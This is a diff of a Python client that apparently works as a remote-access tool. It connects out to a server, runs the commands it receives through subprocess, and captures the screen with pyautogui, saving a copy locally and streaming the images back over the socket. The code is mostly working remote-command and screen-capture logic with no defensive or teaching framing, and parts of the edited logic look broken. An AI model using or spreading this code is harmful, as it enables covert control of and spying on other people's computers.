@@ -1,13 +1,11 @@
 import multiprocessing
-from queue import Queue
 import subprocess
 import socket, sys
 import struct, math
 import pyautogui as py
-from threading import Thread
 import socket, io
 
-PACKET_SIZE = 1024
+PACKET_SIZE = 10000
 
 def connectSocket(HOST, PORT, debug: bool = False) -> socket:
     try:
@@ -25,23 +23,21 @@ def connectSocket(HOST, PORT, debug: bool = False) -> socket:
         return
 
 def sendPackets(sckt: socket, dataToSend: bytearray, debug: bool, dataType: int):
-    try:
-        nOfPacketsToSend = math.ceil(len(dataToSend) / PACKET_SIZE)
-        bytesSent = 0
-        
-        for i in range(nOfPacketsToSend):
-            packetHeaderLength = min(PACKET_SIZE, len(dataToSend)-bytesSent).to_bytes(4, "big")
-            packetHeaderPackets = (nOfPacketsToSend-(i+1)).to_bytes(1, "big")
-            packetPayload = dataToSend[i*PACKET_SIZE:(i*PACKET_SIZE)+min(PACKET_SIZE, len(dataToSend)-bytesSent)]
-            packetDataType = dataType.to_bytes(1, "big")
-            packet = packetHeaderLength + packetHeaderPackets + packetDataType + packetPayload
-            bytesSent += min(PACKET_SIZE, len(dataToSend)-bytesSent)
+    nOfPacketsToSend = math.ceil(len(dataToSend) / PACKET_SIZE)
+    bytesSent = 0
+    for i in range(nOfPacketsToSend):
+        packetHeaderLength = min(PACKET_SIZE, len(dataToSend)-bytesSent).to_bytes(4, "big")
+        packetHeaderPackets = (nOfPacketsToSend-(i+1)).to_bytes(1, "big")
+        packetDataType = dataType.to_bytes(1, "big")
+        packetPayload = dataToSend[i*PACKET_SIZE:(i*PACKET_SIZE)+min(PACKET_SIZE, len(dataToSend)-bytesSent)]
+        packet = packetHeaderLength + packetHeaderPackets + packetDataType + packetPayload
+        bytesSent += min(PACKET_SIZE, len(dataToSend)-bytesSent)
 
-            sckt.sendall(packet)
-            if debug:
-                print("packet: ", packetHeaderLength, packetHeaderPackets, packetPayload)
-    except (Exception):
-        return
+        sckt.sendall(packet)
+        if debug:
+            print("packet: ", packetHeaderLength, packetHeaderPackets, len(dataToSend))
+    #except (Exception):
+        #return
 
 def recvAll(sckt: socket, n: int) -> bytearray:
     try:
@@ -80,23 +76,25 @@ def recvPackets(sckt: socket, debug: bool = False) -> bytearray:
     except:
         return b"EXIT0x02"
 
-def screenShare(frameQueue: Queue):
+def screenShare(frameQueue, isAlive):
+    isAlive = True
     while True:
         frame = py.screenshot()
         frameBytes = io.BytesIO()
         frame.save(frameBytes, format="PNG")
-        frameQueue.put(frame.getvalue())
+        frameQueue.put(frameBytes.getvalue())
 
 
 def comunicazione(HOST, PORT, debug: bool = False):
     clientSocket = connectSocket(HOST, PORT, True)
 
+    isScreenSharerAlive = False
     screenBuffersQueue = multiprocessing.Queue(20)
-    screenSharer = multiprocessing.Process(target=screenShare, args=(screenBuffersQueue,))
+    screenSharer = multiprocessing.Process(target=screenShare, args=(screenBuffersQueue, isScreenSharerAlive))
 
     while 1:
-        typeOfRequest, command = recvPackets(clientSocket).decode()
-
+        typeOfRequest, command = recvPackets(clientSocket, False)
+        command = command.decode()
         # DEBUG
         if debug and not command == "":
             print("command: ", command)
@@ -105,9 +103,9 @@ def comunicazione(HOST, PORT, debug: bool = False):
             screenSharer.terminate()
             sys.exit(0)
         if command == "EXIT0x02":
-            screenSharer.terminate()
-            screenBuffersQueue.close()
-            screenShareActivated = False
+            if screenSharer.is_alive():
+                screenSharer.terminate()
+                screenBuffersQueue.close()
             clientSocket = connectSocket(HOST, PORT, True)      
 
         if typeOfRequest == 0x63:
@@ -123,9 +121,12 @@ def comunicazione(HOST, PORT, debug: bool = False):
                 print(output.stdout)
 
         if typeOfRequest == 0x76:
-            if not screenSharer.is_alive() and "start" in command:
+            if not isScreenSharerAlive and "start" in command:
                 screenSharer.start()
-                sendPackets(clientSocket, screenBuffersQueue.get(), True, 0x76)
+                screenBuffer = screenBuffersQueue.get()
+                with open("s.png", "wb") as file:
+                    file.write(screenBuffer)
+                sendPackets(clientSocket, screenBuffer, True, 0x76)
 
             if "stop" in command:
                 screenSharer.terminate()
